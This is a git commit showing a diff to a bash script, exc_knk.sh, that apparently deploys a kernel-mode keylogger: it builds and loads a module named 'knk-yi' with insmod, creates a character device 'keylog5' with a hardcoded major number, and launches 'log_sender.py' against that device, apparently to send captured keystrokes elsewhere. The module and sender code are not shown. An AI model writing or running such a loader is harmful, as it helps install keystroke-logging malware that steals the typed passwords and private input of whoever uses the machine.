8065e6a12675bbf715d99c9c900949f48380d2cd
yo0x <6yonor@gmail.com>
2021-06-26 14:52:25 +0200

    working on scrip

--- exc_knk.sh
+++ exc_knk.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #GLOBAL VARS
-set -e
+#set -e
 FILE_TO_BUILD='knk-yi'
 DEVICE='keylog5'
 
@@ -11,15 +11,18 @@ make clean
 rm -f keylog*
 rmmod "$FILE_TO_BUILD"
 echo "Builind"
-make -f "$FILE_TO_BUILD".c
+#make -f "$FILE_TO_BUILD".c
+make
 #load module & create inode
 insmod "$FILE_TO_BUILD".ko
+echo "waiting to get MAJOR"
+sleep 9s
 #GET MAJOR MINOR
-MAJOR=$(ls -ln keylog5 \| cut -d \' \' -f 5 \| sed -r \'s/[,]+/ /g\')
-mknod "$DEVICE" c "$MAJOR" 0
+#MAJOR=$(ls -ln keylog5 \| cut -d \' \' -f 5 \| sed -r \'s/[,]+/ /g\')
+mknod "$DEVICE" c 244 0
 
 
 #run python on background
 echo "Running script"
-python3 log_sender.py -f keylog5 -t 5
+$(which python3) log_sender.py -f keylog5 -t 5
 
